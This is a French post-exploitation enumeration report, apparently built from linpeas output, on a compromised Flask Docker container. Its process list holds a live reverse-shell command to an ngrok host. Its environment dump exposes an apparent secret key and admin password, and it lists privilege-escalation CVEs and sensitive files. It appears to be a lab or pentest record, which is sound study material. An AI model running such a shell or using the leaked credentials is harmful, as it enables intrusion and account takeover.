# 📋 Informations de base

- **OS**: Linux 6.1.0-31-amd64 (Debian 6.1.128-1)
- **Utilisateur & Groupes**:
  - uid=998(c2-web)
  - gid=998(c2-web)
  - groups=998(c2-web)
- **Nom d'hôte**: caf697ac4c37

> ⚠️ Pas de capacités de découverte réseau (`fping` ou `ping` absents).  
> ✅ `/usr/bin/bash` disponible pour scan réseau, transfert et détection.

---

# 🖥️ Informations Système

## Système d'exploitation
- **Version**: Linux version 6.1.0-31-amd64
- **lsb_release**: ❌ Non trouvé

## Sudo
- **Version**: ❌ Non trouvé

## PATH
`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`

## Date & Uptime
- **Date**: Tue Mar 25 07:46:42 UTC 2025
- **Uptime**: ❌ Non trouvé

## Disques et système de fichiers
- **Système non monté**: à vérifier
- **/dev/sd*/disk***: Pas d’infos (limite 20)

## Environnement
```
SHELL=/bin/sh
HOSTNAME=caf697ac4c37
PWD=/home/c2-web/.test
LOGNAME=c2-web
DOMAIN=163.172.66.233
HOME=/home/c2-web
SECRET_KEY=SEmuz80xt4oEQK4YsFPt
ADMIN_PASSWORD=wqHQBzgxXZ6mhpdbvL2KfE
ADMIN_USER=admin
USER=c2-web
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MAIL=/var/mail/c2-web
FLASK_RUN_FROM_CLI=true
```

## dmesg & Exploits
- **dmesg**: ❌ Non trouvé

### Vulnérabilités connues détectées :
- **CVE-2022-2586**: `nft_object UAF`
  - [Lien](https://www.openwall.com/lists/oss-security/2022/08/29/5)
  - Exposition : Faible
  - Requiert : `kernel.unprivileged_userns_clone=1`

- **CVE-2021-22555**: `Netfilter heap OOB`
  - [Lien](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)
  - Exposition : Faible
  - Requiert : module `ip_tables` chargé

---

# 🔐 Protections

| Protection           | État        |
|----------------------|-------------|
| AppArmor             | ❌ Non trouvé |
| Profil AppArmor      | ✅ docker-default (enforcement) |
| grsecurity           | ❌ Non trouvé |
| PaX                  | ❌ Non trouvé |
| Execshield           | ❌ Non trouvé |
| SELinux              | ❌ Non trouvé |
| Seccomp              | ✅ activé   |
| Namespace utilisateur| ✅ activé   |
| Cgroup2              | ✅ activé   |
| ASLR                 | ✅ Oui      |
| Imprimante détectée  | ❌ Non      |
| Machine virtuelle    | ❌ Non      |

---

# 📦 Conteneur

| Élément                         | Valeur         |
|--------------------------------|----------------|
| Est-ce un conteneur ?          | ✅ docker       |
| Conteneur en cours d'exécution | ❌ Non          |
| Groupe docker présent ?        | ❌ Non          |
| Version Docker                 | ❌ Non trouvée  |
| CVE-2019-5736                  | ❌ Non trouvé   |
| CVE-2019-13139                 | ❌ Non trouvé   |
| CVE-2021-41091                 | ❌ Non trouvé   |
| Docker rootless                | ❌ Non          |

---

# 🧠 Processus, Crons, Timers & Sockets

## Processus en cours (lecture /proc)
```
5115 bashlinpeas.sh
5111 sort -r
5110 bashlinpeas.sh
2368 bashlinpeas.sh
1920 bash -i
1919 bash -c bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/10426 0>&1
20   /usr/bin/python3 /usr/local/bin/flask run --host=0.0.0.0 --port=5000
19   /usr/bin/python3 /usr/local/bin/flask run --host=0.0.0.0 --port=3000
18   sh -c flask run --host=0.0.0.0 --port=3000
17   sh -c flask run --host=0.0.0.0 --port=5000
16   su -c flask run --host=0.0.0.0 --port=3000 c2-api
15   su -c flask run --host=0.0.0.0 --port=5000 c2-web
14   /bin/bash /entrypoint.sh
13   /usr/sbin/cron
1    /bin/bash /entrypoint.sh
```

## Crons
- **/usr/bin/crontab**: ✅
- **/etc/crontab**: présent (1042 bytes, root)
- **incrontab**: ❌

### Tâches planifiées
```
17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6 * * 7 root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6 1 * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

## Tâches cron.d/daily/hourly/monthly/etc.
- `cron.d`: 3 fichiers
- `cron.daily`: 28 fichiers
- `cron.hourly`: 12 fichiers
- `cron.monthly`: 12 fichiers
- `cron.weekly`: 12 fichiers
- `cron.yearly`: 12 fichiers

## Services / Sockets
- `.service`, `.timer`, `.socket`, D-Bus: ❌ Non trouvés

---

# 🌐 Réseau

## Interfaces
- **default**: 0.0.0.0
- **loopback**: 127.0.0.0
- **link-local**: 169.254.0.0

## Données
- **lo**: 282655 bytes (3280 packets)
- **eth0**: 1961472 bytes (1586 packets)

## DNS
```
nameserver 127.0.0.11
search online.net
options ndots:0
```

## Hosts
```
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.20.0.2 caf697ac4c37
```

## Ports & Sniffing
- Ports actifs : ❌ Non trouvé
- `tcpdump` disponible : ❌ Non

---

# 👤 Utilisateurs

## Connexion actuelle
- uid=998(c2-web) gid=998(c2-web)

## Utilisateurs système avec console :
```
administrator:x:997:997:/home/administrator:/bin/sh
c2-api:x:999:999:/home/c2-api:/bin/sh
c2-web:x:998:998:/home/c2-web:/bin/sh
root:x:0:0:/root:/bin/bash
```

## Clés GPG
- `/usr/bin/gpg` ✅
- `netpgp` & `netpgpkeys` ❌ Non trouvés

## sudo/pkexec
- `sudo`, `pkexec` ❌ Non trouvés
- ptrace : désactivé (0)

---

# 🧩 Logiciels & Fichiers

## Logiciels installés
- base64, curl, gcc/g++, make, perl, python3

## Compilateurs :
- `g++`, `gcc` (12.2.0)
- `rpcsvc-proto`: 1.4.3-1

## PAM / LDAP / Keyrings
- `/etc/pam.d`, `/etc/ldap`, `/etc/apt/keyrings`, `/usr/share/keyrings` : ✅

## Fichiers sensibles :
- **/etc/skel/.bashrc**
- **/home/*/.bashrc**
- **/etc/cron.d/backup**
- **/var/log/backup.log**

## Executables & scripts ajoutés
- `/home/c2-web/.test/linpeas.sh`
- `/usr/local/bin/flask`
- `/app/app.py`
- `/app/static/assets/*`

## SUID/SGID :
- SUID : `/usr/bin/passwd`, `/usr/bin/su`, ...
- SGID : `/usr/bin/crontab`, `/usr/sbin/unix_chkpwd`, ...

## Permissions spéciales
- ACLs : ❌
- Capabilités : présent (CapBnd=00000000a80425fb)

---

# 🧪 Recherche de mots de passe

## Historique & fichiers suspects
- `/home/c2-web/.bash_history` ✅
- Fichiers contenant "password" :
  - `/etc/pam.d/common-password`
  - `/var/cache/debconf/passwords.dat`

## Répertoires accessibles en écriture :
- `/dev/shm`, `/tmp`, `/var/tmp`, `/home/c2-web`

---

**📌 Fin du rapport**
